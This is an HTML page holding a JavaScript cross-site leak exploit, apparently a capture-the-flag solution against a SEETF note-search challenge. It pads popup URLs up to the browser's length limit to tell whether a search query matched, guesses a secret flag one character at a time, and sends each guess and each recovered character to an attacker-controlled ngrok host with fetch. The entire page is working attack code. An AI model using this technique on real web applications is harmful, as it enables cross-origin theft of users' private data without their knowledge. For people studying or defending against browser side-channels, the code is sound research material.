<html>
<body>
<script>
    (async () => {

        const sleep = (ms) => {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        const leak = async (url) => {
            let w = window.open(url + "#" + "A".repeat(2 * 1024 * 1024 - url.length - 1));
            await sleep(800);
            try {
                // Page is still same-origin, so about:blank page loaded
                // The URL length limit was exceeded
                w.origin;
                await w.close();
                return 0;
            } catch {
                // The URL length limit was not exceeded, so note was found
                await w.close();
                return 1;
            }
        }

        let flag = "SEE{m4"

        const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
        const OUR_URL = "https://ca0f-175-156-124-45.ngrok-free.app"

        const solve = async (char) => {
            // ?q=AAAA   redirects to
            // ?found=0  if note not found (so the URL is one character too long)
            // We can only check 4 characters at a time
            if (await leak(`http://mnc.web.seetf.sg:1337/?q=${flag.slice(-3) + char}`)) {
                await fetch(`${OUR_URL}?flag=${flag + char}`);
                return true;
            }
        }

        while (flag.charAt(flag.length - 1) != "}") {
            for (let char of CHARSET) {
                fetch(`${OUR_URL}?trying=${char}`);
                if (await solve(char)) {
                    flag += char;
                    break;
                }
            }
        }
    })();
</script>
</body>
</html>